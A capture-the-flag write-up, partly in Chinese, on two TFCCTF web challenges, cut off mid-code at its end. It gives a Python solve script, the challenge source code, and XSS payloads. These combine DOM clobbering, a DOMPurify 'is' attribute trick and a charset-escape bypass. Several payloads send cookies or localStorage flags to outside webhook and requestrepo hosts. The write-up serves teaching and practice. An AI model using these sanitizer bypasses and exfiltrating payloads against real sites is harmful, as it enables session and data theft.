<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">URL = <span class="string">&quot;https://webless-80ef21500315e18a.challs.tfcctf.com&quot;</span></span><br><span class="line"></span><br><span class="line">solution = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe src=&quot;/post/0&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iframe credentialless src=&quot;/login?username=&lt;script&gt;fetch(`https://webhook.site/ed920e87-fa2c-4fac-983f-0a3c31613a47/$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;`)&lt;/script&gt;&amp;password=a&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s.post(URL+<span class="string">&quot;/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/create_post&quot;</span>, data=&#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;LEAK&quot;</span>, <span class="string">&quot;description&quot;</span>: solution, <span class="string">&quot;hidden&quot;</span>: <span class="string">&quot;off&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/report&quot;</span>, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:5000/post/1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Check the webhook&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="DOM-NOTIFY"><a href="#DOM-NOTIFY" class="headerlink" title="DOM NOTIFY"></a>DOM NOTIFY</h2><p>server.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> rateLimit = <span class="built_in">require</span>(<span class="string">&#x27;express-rate-limit&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; saveNote, getNote &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./db/db&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; sanitizeContent &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; visit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./bot&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup EJS as the view engine</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Rate limit: max 5 requests per 1 minute per IP</span></span><br><span class="line"><span class="keyword">const</span> reportLimiter = <span class="title function_">rateLimit</span>(&#123;</span><br><span class="line">  <span class="attr">windowMs</span>: <span class="number">1</span> * <span class="number">60</span> * <span class="number">1000</span>, <span class="comment">// 1 minute</span></span><br><span class="line">  <span class="attr">max</span>: <span class="number">5</span>, <span class="comment">// limit each IP to 5 requests per windowMs</span></span><br><span class="line">  <span class="attr">message</span>: <span class="string">&#x27;Too many reports from this IP, please try again later.&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;X-Content-Type-Options&#x27;</span>, <span class="string">&#x27;nosniff&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middleware</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route: Home page - form to create a note</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>); </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route: Handle form submission</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/note/create&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  content = <span class="title function_">sanitizeContent</span>(content)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = <span class="title function_">uuidv4</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">saveNote</span>(id, content);</span><br><span class="line">    res.<span class="title function_">redirect</span>(id);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error saving note.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route: View a note by ID</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:id&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="keyword">await</span> <span class="title function_">getNote</span>(id);</span><br><span class="line">    <span class="keyword">if</span> (note) &#123;</span><br><span class="line">      res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, &#123; id, <span class="attr">content</span>: note.<span class="property">content</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">render</span>(<span class="string">&#x27;notfound&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error retrieving note.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route: Report a note to admin</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, reportLimiter, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="keyword">await</span> <span class="title function_">getNote</span>(id);</span><br><span class="line">    <span class="keyword">if</span> (note) &#123;</span><br><span class="line">      <span class="title function_">visit</span>(id);</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Note reported!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not found!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error retrieving note.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route: Return multiple custom elements as JSON</span></span><br><span class="line"><span class="comment">// !! At the moment the route seems to have some frontend errors, so we disabled it in the main.js</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/custom-divs&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> customElements = [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&#x27;fancy-div&#x27;</span>, <span class="attr">observedAttribute</span>: <span class="string">&#x27;color&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&#x27;huge-div&#x27;</span>, <span class="attr">observedAttribute</span>: <span class="string">&#x27;font&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&#x27;title-div&#x27;</span>, <span class="attr">observedAttribute</span>: <span class="string">&#x27;title&#x27;</span> &#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">json</span>(customElements);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start server</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>utils.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">JSDOM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;jsdom&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> createDOMPurify = <span class="built_in">require</span>(<span class="string">&#x27;dompurify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup DOMPurify</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">window</span> = (<span class="keyword">new</span> <span class="title function_">JSDOM</span>(<span class="string">&#x27;&#x27;</span>)).<span class="property">window</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="variable language_">window</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitizeContent</span>(<span class="params">content</span>) &#123;</span><br><span class="line">    <span class="comment">// Sanitize the note with DOMPurify</span></span><br><span class="line">    content = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content, &#123;</span><br><span class="line">        <span class="attr">ALLOWED_TAGS</span>: [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;em&#x27;</span>, <span class="string">&#x27;strong&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;span&#x27;</span>],</span><br><span class="line">        <span class="attr">ALLOWED_ATTR</span>: [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make sure that no empty strings are left in the attributes values</span></span><br><span class="line">    content = content.<span class="title function_">replace</span>(<span class="regexp">/&quot;&quot;/g</span>, <span class="string">&#x27;invalid-value&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    sanitizeContent</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>


<p>main.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// window.custom_elements.enabled = true;</span></span><br><span class="line"><span class="keyword">const</span> endpoint = <span class="variable language_">window</span>.<span class="property">custom_elements</span>.<span class="property">endpoint</span> || <span class="string">&#x27;/custom-divs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchCustomElements</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Fetching elements&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(endpoint);</span><br><span class="line">    <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`HTTP error! status: <span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> customElements = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Custom Elements fetched:&#x27;</span>, customElements);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> customElements;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createElements</span>(<span class="params">elements</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Registering elements&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> element <span class="keyword">of</span> elements) &#123;</span><br><span class="line">        <span class="comment">// Registers a custom element</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(element)</span><br><span class="line">        customElements.<span class="title function_">define</span>(element.<span class="property">name</span>, <span class="keyword">class</span> <span class="title class_">extends</span> <span class="title class_">HTMLDivElement</span> &#123;</span><br><span class="line">            <span class="keyword">static</span> <span class="keyword">get</span> <span class="title function_">observedAttributes</span>() &#123; </span><br><span class="line">                <span class="keyword">if</span> (element.<span class="property">observedAttribute</span>.<span class="title function_">includes</span>(<span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> [element.<span class="property">observedAttribute</span>]; </span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> [];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_">attributeChangedCallback</span>(<span class="params">name, oldValue, newValue</span>) &#123;</span><br><span class="line">                <span class="comment">// Log when attribute is changed</span></span><br><span class="line">                <span class="built_in">eval</span>(<span class="string">`console.log(&#x27;Old value: <span class="subst">$&#123;oldValue&#125;</span>&#x27;, &#x27;New Value: <span class="subst">$&#123;newValue&#125;</span>&#x27;)`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, &#123; <span class="attr">extends</span>: <span class="string">&#x27;div&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// When the DOM is loaded</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> enabled = <span class="variable language_">window</span>.<span class="property">custom_elements</span>.<span class="property">enabled</span> || <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Check if the custom div functionality is enabled</span></span><br><span class="line">    <span class="keyword">if</span> (enabled) &#123;</span><br><span class="line">        <span class="keyword">var</span> customDivs = <span class="keyword">await</span> <span class="title function_">fetchCustomElements</span>();</span><br><span class="line">        <span class="title function_">createElements</span>(customDivs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可能是DOM破坏?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=custom_elements&gt;&lt;a id=custom_elements name=enabled&gt;&lt;a id=custom_elements name=endpoint href=//kws1oh3y.requestrepo.com&gt;</span><br></pre></td></tr></table></figure>

<p>很好，我们现在能向任意网站获得数据了,我们继续</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;name&quot;:&quot;title-div&quot;,&quot;observedAttribute&quot;:&quot;data-id&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>如果我们监听这种全局属性性呢？<code>data-*</code></p>
<p>发现DOMPurify认为data-id与id都是被允许的,不会删除此属性!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALLOWED_ATTR: [&#x27;id&#x27;, &#x27;class&#x27;, &#x27;name&#x27;, &#x27;href&#x27;, &#x27;title&#x27;]</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://jorianwoltjer.com/blog/p/research/mutation-xss">https://jorianwoltjer.com/blog/p/research/mutation-xss</a></p>
<blockquote>
<p>因为特殊原因 DOMPurify 在有些情况无法清理is属性？</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=new DOMParser().parseFromString(&#x27;&lt;a is=&quot;to-delete&quot;&gt;&#x27;, &quot;text/html&quot;);</span><br><span class="line">a.body.firstChild.removeAttribute(&quot;is&quot;);</span><br><span class="line">a.getRootNode().body.firstChild;</span><br><span class="line">&gt;&gt;&gt; &lt;a&gt;&lt;/a&gt;</span><br><span class="line">a.getRootNode().body.firstChild.outerHTML;</span><br><span class="line">&gt;&gt;&gt; &#x27;&lt;a is=&quot;to-delete&quot;&gt;&lt;/a&gt;&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div is=&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>is成功成为了invalid-value</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;name&quot;:&quot;invalid-value&quot;,&quot;observedAttribute&quot;:&quot;data-class&quot;&#125;]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-class=some is= &gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>成功了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div is=&quot;invalid-value&quot; data-class=&quot;some&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=custom_elements&gt;&lt;a id=custom_elements name=enabled&gt;&lt;a id=custom_elements name=endpoint href=//kws1oh3y.requestrepo.com&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div data-class=&quot;&#x27;);fetch(&#x27;https://kws1oh3y.requestrepo.com/?flag=&#x27;+localStorage.getItem(&#x27;flag&#x27;))&lt;!--&quot; is=&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>其它解法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;custom_elements&quot;&gt;</span><br><span class="line">     &lt;a id=&quot;custom_elements&quot; name=&quot;enabled&quot; href=&quot;controlled&quot;&gt;&lt;/a&gt;</span><br><span class="line">     &lt;a id=&quot;custom_elements&quot; name=&quot;endpoint&quot; href=&quot;https://1338.n2l.team/payload.json&quot;&gt;&lt;/a</span><br><span class="line">   &gt;</span><br><span class="line">   </span><br><span class="line">   &lt;div is=&quot;evil-div&quot; data-x=&quot;&#x27;);fetch(&#x27;https://1338.n2l.team/?f=&#x27;+JSON.stringify(localStorage));//&quot; &gt;&lt;/div&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">bypass dompurify + double encoded charset for bot spidey</span><br><span class="line"></span><br><span class="line">const createDOMPurify = require(&quot;dompurify&quot;);</span><br><span class="line">const &#123; JSDOM &#125; = require(&quot;jsdom&quot;);</span><br><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line"></span><br><span class="line">const server = http.createServer((req, res) =&gt; &#123;</span><br><span class="line">    res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);</span><br><span class="line">    res.end(&#x27;&lt;a id=&quot;\\x1b$B&quot;&gt;&lt;/a&gt;\\x1b(B&lt;a src=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;&lt;/a&gt;&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const PORT = process.env.PORT || 1337;</span><br><span class="line">server.listen(PORT, () =&gt; &#123;</span><br><span class="line">  console.log(`Server is running on port $&#123;PORT&#125;`);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bot saved the html</span><br><span class="line">const html = await driver.getPageSource();</span><br><span class="line"></span><br><span class="line">as </span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a id=&quot;\x1b$B&quot;&gt;&lt;/a&gt;\x1b(B&lt;a src=&quot;&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&quot;&gt;&lt;/a&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">after that it passed to dompu</span><br><span class="line">    const clean = DOMPurify.sanitize(&#x27;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a id=&quot;\x1b$B&quot;&gt;&lt;/a&gt;\x1b(B&lt;a src=&quot;&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&quot;&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">after it got cleaned the xss still works because content type text/html without charset is supplied</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;div is=&quot;&quot; aria-label=&quot;;)alert(1);//&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// server.js</span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">const PORT = 3838;</span><br><span class="line"></span><br><span class="line">// 